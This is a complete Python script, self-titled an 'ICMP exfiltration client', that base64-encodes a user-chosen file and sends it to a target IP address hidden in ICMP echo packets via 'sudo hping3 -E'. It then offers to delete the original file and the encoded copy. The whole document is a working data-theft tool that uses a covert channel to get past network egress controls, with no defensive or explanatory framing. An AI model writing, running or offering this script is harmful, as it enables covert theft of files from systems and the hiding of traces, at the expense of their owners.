import os
import subprocess as s
import base64 as b
import time as t
import sys

print('\n**********************************')
print('*****ICMP*EXFILTRATION*CLIENT*****')
print('**********************************\n')

activeInterface = input('Enter your active local interface (eth0, wlan0, etc.): ').lower()
try:
    localIP = s.getoutput('/sbin/ifconfig %s' % activeInterface).split('\n')[1][20:].split(' ')[0]
    print('\nYour local IP address is: ' + localIP)
except Exception as e:
    print('Something went wrong: ' + repr(e))
    print('Exiting...')
    sys.exit()

try:
    externalIP = s.getoutput('curl ipv4.icanhazip.com').split('\n')[5]
    print('\nYour external IP address is: ' + externalIP)
except Exception as e:
    print('Unable to determine external IP address.  Please verify Internet connectivity.')
    print('Exiting...')
    sys.exit()

origFile = input('\nEnter the absolute path of a file to exfil: ')

if os.path.isfile(origFile):
    pass
else:
    print ('File does not exist... Exiting!!!')
    t.sleep(1)
    sys.exit()

targetAddr = input('\nEnter the target IP address: ')

def encodeFile(file):
    global splitFile
    splitFile = origFile.split("/")
    splitFile = '64'+splitFile[-1]
    o = open(splitFile, "wb")

    with open(origFile, "rb") as f:
        o.write(b.b64encode(f.read()))   

print ('\nBase64 encoding the file...\n')

encodeFile(origFile)

t.sleep(1)

dataSize = input('Enter the amount of data (in bytes) to send per packet: ')

numPackets = os.stat(splitFile).st_size

numPackets = int((numPackets / int(dataSize)) + 1)

print('\nThe file wil be exfiltrated in ' + str(numPackets) + ' packets.\n')

input('Make sure the SERVER is running and press ENTER to continue...')


s.call(["sudo", "hping3", str(targetAddr), "--icmp", "-C", "8", "-d", str(dataSize), "-c", str(numPackets) , "-E", splitFile])

print ('\nCleaning up...\n')

deleteOrigFile = input('Delete the original file? Y|N ').upper()

if deleteOrigFile == 'Y':
    os.remove(origFile)
    print (origFile + ' has been deleted...')
elif deleteOrigFile == 'N':
    print (origFile + ' has not been deleted...')
else:
    print ('I didn\'t understand that...')

deleteEncodedFile = input('Delete the encoded file? Y|N ').upper()

if deleteEncodedFile == 'Y':
    os.remove(splitFile)
    print (splitFile + ' has been deleted...  Exiting...')
    t.sleep(1)
    sys.exit()
elif deleteEncodedFile == 'N':
    print (splitFile + ' has not been deleted...  Exiting...')
    t.sleep(1)
    sys.exit()
else:
    print ('I didn\'t understand that...  Exiting...')
    t.sleep(1)
    sys.exit()
